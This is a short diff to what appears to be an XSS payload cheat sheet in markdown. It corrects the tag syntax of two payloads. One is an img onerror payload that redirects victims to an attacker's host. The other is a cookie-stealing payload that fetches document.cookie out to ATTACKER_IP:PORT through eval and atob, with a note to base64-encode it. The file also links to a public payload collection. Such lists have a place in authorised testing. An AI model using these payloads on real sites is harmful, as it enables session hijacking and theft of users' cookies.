@@ -6,11 +6,11 @@
 
 ### PoC Payload 2: 
 
-    <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/<
+    <img src=x onerror="document.location='http://ATTACKER_IP:PORT/'"/>
 
 ### Steal cookie XSS Payload: 
 
-    <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /< (ENCODE THE ATOB PAYLOAD IN BASE64)
+    <img src=x onerror='eval(atob("fetch('http://ATTACKER_IP:PORT/?cookie='+document.cookie)"));' /> (ENCODE THE ATOB PAYLOAD IN BASE64)
 
 ## Payloads: https://github.com/swisskyrepo/PayloadsAllTheThings
 
